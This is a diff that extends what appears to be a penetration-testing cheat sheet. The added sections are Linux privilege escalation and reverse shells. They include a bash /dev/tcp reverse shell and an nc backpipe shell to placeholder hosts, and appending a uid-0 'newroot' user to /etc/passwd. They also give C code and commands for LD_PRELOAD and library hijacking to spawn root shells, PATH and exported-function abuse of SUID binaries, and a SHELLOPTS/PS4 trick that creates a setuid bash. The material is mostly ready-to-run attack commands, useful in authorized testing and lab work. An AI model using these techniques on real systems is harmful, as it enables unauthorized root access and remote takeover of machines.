@@ -39,6 +39,10 @@
 * [ASCII to Char](#ASCII-to-Char)
 * [Extract All File in Directory](#Extract-All-File-in-Directory)
 * [Directory Files Iteration](#Directory-Files-Iteration)
+* [Preload](#Preload)
+* [Library Hijack](#Library-Hijack)
+* [C Bash Spawn](#C-Bash-Spawn)
+* [Abusing Shell](#Abusing-Shell)
 * [Metasploit](#Metasploit)
 
 
@@ -380,6 +384,9 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {TARGET}
 
 # Showmount
 showmount -e {TARGET}
+
+# Exports
+cat /etc/exports
 ```
 
 ### Mount
@@ -515,7 +522,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # SUID
 
 ```
+# SUID
 find / -type f -perm -u=s 2>/dev/null
+
+# SUID + GUID
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
 # Sudo
@@ -547,11 +558,17 @@ echo "{USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 nc -lcnp {PORT}
 ```
 
+### Reverse Shell
+
+```
+bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+```
+
 ### Reverse Shell Using Backpipe
 
 ```
 mknod /tmp/backpipe p
-/bin/sh 0</tmp/backpipe | nc 192.168.1.116 4444 1>/tmp/backpipe
+/bin/sh 0</tmp/backpipe | nc {IP} {PORT} 1>/tmp/backpipe
 ```
 
 # Payloads
@@ -564,9 +581,24 @@ msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
 
 # Linux Password
 
-### Password Hash
+### /etc/shadow
 
 ```
+mkpasswd -m sha-512 root
+$6$bAzyC2dw/9TlXnh$EdycGclOk2oAWJ3ewD0jAebV4E0f15i79Ej4QC0hG/3ILILbSNckjNRQZn0ggnjPqXdgjX2kvzMDRJ5nzhZQG1
+```
+
+### /etc/passwd
+
+```
+# Generate Password Hash
+openssl passwd password
+wI1Q.j5MF3peQ
+
+# Add 'newroot' User
+echo "newroot:wI1Q.j5MF3peQ:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# Generate Password Hash With Salt
 openssl passwd -1 -salt root root
 $1$root$9gr5KxwuEdiI80GtIzd.U0
 ```
@@ -775,7 +807,111 @@ for file in ./path/*.txt ; do
 done
 ```
 
+# Preload
 
+```
+$ cat preload.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+# Usage
+$ sudo -l
+(root) NOPASSWD: /usr/sbin/apache2
+
+$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /absolute/path/preload.c
+$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
+```
+
+# Library Hijack
+
+```
+$ cat library.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+# Usage
+$ sudo -l
+(root) NOPASSWD: /usr/sbin/apache2
+
+$ ldd /usr/sbin/apache2
+libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f356c962000)
+
+$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /absolute/path/library.c
+$ sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+# C Bash Spawn
+
+```
+$ cat bash_spwan.c
+
+int main() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+```
+
+# Abusing Shell
+
+### 1)
+
+```
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ strings /suid/binary
+service apache2 start
+
+$ gcc -o service /absolte/path/bash_spawn.c
+$ PATH=.:$PATH /suid/binary
+```
+
+### 2)
+
+```
+$ /bin/bash --version
+# Version need to be less than 4.2-048
+
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ strings /suid/binary
+/usr/sbin/service apache2 start
+
+$ function /usr/sbin/service { /bin/bash -p; }
+$ export -f /usr/sbin/service
+$ /suid/binary
+```
+
+### 3)
+
+```
+$ /bin/bash --version
+# Version need to be less than 4.4
+
+$ ls -lah /suid/binary
+-rwsr-sr-x 1 root staff 6.8K May 14  2017 /suid/binary
+
+$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /suid/binary
+$ /tmp/rootbash -p
+```
 
 
 
